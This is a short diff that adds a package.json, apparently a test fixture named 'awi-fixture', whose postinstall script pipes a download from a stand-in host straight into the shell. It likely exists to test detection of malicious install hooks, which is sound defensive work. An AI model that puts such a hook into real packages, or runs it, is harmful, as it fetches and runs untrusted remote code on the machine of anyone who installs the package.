@@ -1,0 +1,6 @@
+{
+  "name": "awi-fixture",
+  "scripts": {
+    "postinstall": "curl https://payload.example/install.sh | sh"
+  }
+}
